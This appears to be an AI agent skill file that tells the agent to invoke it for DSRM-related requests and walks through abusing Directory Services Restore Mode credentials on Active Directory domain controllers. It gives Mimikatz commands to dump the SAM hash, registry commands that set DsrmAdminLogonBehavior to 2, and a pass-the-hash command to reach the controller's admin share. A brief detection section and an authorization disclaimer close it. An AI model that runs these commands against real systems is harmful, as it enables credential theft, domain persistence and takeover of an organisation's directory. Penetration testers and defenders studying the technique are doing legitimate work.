---
name: dsrm-credentials
description: How to access and leverage Directory Services Restore Mode (DSRM) credentials on Active Directory Domain Controllers. Use this skill whenever the user mentions DSRM, domain controller local administrator access, Active Directory credential extraction, DC local admin, DsrmAdminLogonBehavior, or any scenario involving accessing the local Administrator account on a domain controller for security testing, penetration testing, or assessment purposes.
---

# DSRM Credentials Access

This skill covers the methodology for accessing Directory Services Restore Mode (DSRM) credentials on Active Directory Domain Controllers.

## Overview

Each Domain Controller has a local Administrator account. With admin privileges on the DC, you can dump the local Administrator hash and modify registry settings to enable remote access to this account.

## Prerequisites

- Administrative access to the Domain Controller
- Mimikatz or similar credential dumping tool
- PowerShell execution capability

## Step 1: Dump the Local Administrator Hash

Use Mimikatz to extract the SAM database and obtain the local Administrator hash:

```powershell
Invoke-Mimikatz -Command '"token::elevate" "lsadump::sam"'
```

This will dump the local SAM database and reveal the Administrator hash.

## Step 2: Configure Registry for Remote Access

Check if the DsrmAdminLogonBehavior registry key exists and has the correct value:

```powershell
Get-ItemProperty "HKLM:\SYSTEM\CURRENTCONTROLSET\CONTROL\LSA" -name DsrmAdminLogonBehavior
```

If the key doesn't exist or has a value other than "2", create or modify it:

```powershell
# Create key with value "2" if it doesn't exist
New-ItemProperty "HKLM:\SYSTEM\CURRENTCONTROLSET\CONTROL\LSA" -name DsrmAdminLogonBehavior -value 2 -PropertyType DWORD

# Or change existing value to "2"
Set-ItemProperty "HKLM:\SYSTEM\CURRENTCONTROLSET\CONTROL\LSA" -name DsrmAdminLogonBehavior -value 2
```

**Important:** The value must be set to "2" to allow remote authentication using the local Administrator account.

## Step 3: Pass-the-Hash Attack

With the hash and registry configured, perform a Pass-the-Hash attack to access the DC remotely. **Note:** The "domain" parameter should be the DC hostname, not the actual domain name:

```powershell
sekurlsa::pth /domain:dc-host-name /user:Administrator /ntlm:HASH /run:powershell.exe
```

Replace `dc-host-name` with the actual DC hostname and `HASH` with the extracted NTLM hash.

Once the new PowerShell session spawns, you can access shared resources:

```powershell
ls \\dc-host-name\C$
```

## Detection and Mitigation

### Monitoring

- **Event ID 4657** - Audit creation/change of `HKLM:\System\CurrentControlSet\Control\Lsa\DsrmAdminLogonBehavior`

### Mitigation

- Monitor registry changes to the DsrmAdminLogonBehavior key
- Restrict administrative access to Domain Controllers
- Implement proper logging and alerting for credential dumping activities

## References

- [ADSecurity - DSRM Admin Logon Behavior](https://adsecurity.org/?p=1714)
- [ADSecurity - DSRM Credentials](https://adsecurity.org/?p=1785)

## Important Notes

- This technique is for authorized security testing and assessment only
- Ensure you have proper authorization before performing these actions
- The DSRM credentials are typically set during DC promotion and may differ from the domain Administrator account
- This method requires initial administrative access to the Domain Controller
